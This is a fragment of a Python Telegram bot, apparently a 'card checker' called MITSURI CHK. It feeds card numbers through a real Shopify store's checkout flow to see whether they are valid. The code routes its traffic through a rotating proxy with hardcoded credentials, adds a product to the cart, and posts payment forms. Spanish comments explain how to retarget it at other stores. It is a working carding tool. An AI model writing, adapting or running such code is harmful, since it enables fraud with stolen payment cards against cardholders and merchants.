...
@Client.on_message(filters.command("af", prefixes=['.','/','!','?'], case_sensitive=False) & filters.text)
...
GATEWAY: <code>AFRODITA</code>
PASARELA: <code>SHOPIFY $10</code></code> 
</b>""")
...
<b>あ MITSURI CHK あ</b>
<b>Gateway: <code>AFRODITA</code></b> 
<b>Proceso: Verificando...</b>
<b>Tarjeta:</b> <code>{ccs}</code>
<b>Informacion:</b> {x.get("type")} {x.get("level")} {x.get("flag")}""")
        
        session = requests.Session()
        session.proxies = {'https': 'http://exxfmtgy-rotate:luaolp066df0@p.webshare.io:80'}

        inicio = time.time()
        print("</> INICIADO...")
        #-----------PASO N° 1 REEMPLAZAR ID DEL PRODUCTO-----------#
        #--------ID DEL PRODUCTO ---------#
        payload_1 = {'id': '32689481089072'}
        
        #-----------PASO N° 2 REEMPLAZAR URL ADD CART-----------#
        req1 = session.post(url=f'https://www.toadandco.com/cart/add.js', data=payload_1)
        time.sleep(1)
        print("</> PRODUCTO AGREGADO AL CARRIDO")
        
        #-----------PASO N° 3 REEMPLAZAR URL CHECKUOT-----------#
        req3 = session.post(url=f"https://www.toadandco.com/checkout/")
        ...
        payload_4 = {
            ...
            "payment_session_scope": "www.toadandco.com"
        }
        ...
        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=39593541680&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B12485674665&checkout%5Btotal_price%5D=1794&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=693&checkout%5Bclient_details%5D%5Bbrowser_height%5D=654&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=0'
